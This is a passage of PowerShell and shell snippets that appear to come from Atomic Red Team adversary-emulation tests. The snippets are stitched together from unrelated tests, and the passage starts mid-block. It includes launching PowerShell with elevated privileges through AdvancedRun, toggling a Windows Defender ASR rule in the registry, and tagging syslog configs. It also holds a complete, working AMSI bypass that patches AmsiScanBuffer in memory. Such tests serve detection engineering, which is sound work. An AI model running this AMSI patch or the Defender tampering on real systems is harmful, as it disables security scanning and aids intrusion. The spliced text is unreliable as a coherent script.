  Try {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
}

$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"

if (-not (Test-Path $registryPath)) {
  New-Item -Path $registryPath -Force
  Write-Host "Registry key created: $registryPath"
}

$registryValueName = "ASRRules"

if (Test-Path "$registryPath\$registryValueName") {
  Remove-ItemProperty -Path $registryPath -Name $registryValueName
  Write-Host "Registry value deleted: $registryValueName"
} else {
  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value "36190899-1602-49e8-8b27-eb1d0a1ce869=1" -Force
  Write-Host "Registry value created: $registryValueName"
}


Remove-ItemProperty -Path $registryPath -Name $registryValueName
Write-Host "Registry value deleted: $registryValueName"

if [ -f "/etc/syslog.conf" ];
then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf
fi
if [ -f "/etc/rsyslog.conf" ];
then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf
fi
if [ -f "/etc/syslog-ng/syslog-ng.conf" ];
then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf
fi

Add-Type -MemberDefinition @'
  [DllImport("kernel32.dll")]
  public static extern IntPtr GetModuleHandle(string lpModuleName);

  [DllImport("kernel32.dll")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

  [DllImport("kernel32.dll")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -Name "Win32" -Namespace "AMSI"

$hAmsi = [AMSI.Win32]::GetModuleHandle("amsi.dll")
$addr = [AMSI.Win32]::GetProcAddress($hAmsi, "AmsiScanBuffer")

$oldProtect = 0
if ([IntPtr]::Size -eq 8) {
  $patch = [byte[]]@(0xB0, 0x01, 0xC3)
} else {
  $patch = [byte[]]@(0xB0, 0x01, 0xC2, 0x18, 0x00)
}

[AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
[AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null

$targetPath = [System.IO.Path]::GetFullPath("$env:TEMP\{15755e6b-a54d-4a6e-9773-554c724f8a63}")
$tempRoot = [System.IO.Path]::GetFullPath($env:TEMP).TrimEnd('\') + '\'
if (-not $targetPath.StartsWith($tempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
  throw "Refusing to create a test file outside the current user's TEMP directory: $targetPath"
}

$markerPath = "$targetPath.atomic-test-owner"
if ([System.IO.File]::Exists($targetPath) -or [System.IO.Directory]::Exists($targetPath)) {
  throw "Refusing to overwrite an existing path: $targetPath"
}
if ([System.IO.File]::Exists($markerPath)) {
  throw "Refusing to reuse an existing ownership marker: $markerPath"
}

$pendingMarker = "AtomicTest T1685 pending`n$targetPath"
[System.IO.File]::WriteAllText($markerPath, $pendingMarker)
try {
  & fsutil.exe file createnew $targetPath 10485760
  if ($LASTEXITCODE -ne 0) {
    throw "fsutil failed with exit code $LASTEXITCODE"
  }

  [System.IO.File]::SetAttributes($targetPath, ([System.IO.File]::GetAttributes($targetPath) -bor [System.IO.FileAttributes]::Hidden))
  $createdFile = Get-Item -LiteralPath $targetPath -Force -ErrorAction Stop
  $ownerMarker = "AtomicTest T1685`n$targetPath`n$($createdFile.CreationTimeUtc.Ticks)`n$($createdFile.LastWriteTimeUtc.Ticks)`n$($createdFile.Length)"
  [System.IO.File]::WriteAllText($markerPath, $ownerMarker)
}
catch {
  if ([System.IO.File]::Exists($markerPath) -and ([System.IO.File]::ReadAllText($markerPath) -ceq $pendingMarker)) {
    Remove-Item -LiteralPath $markerPath -Force
  }
  throw
}
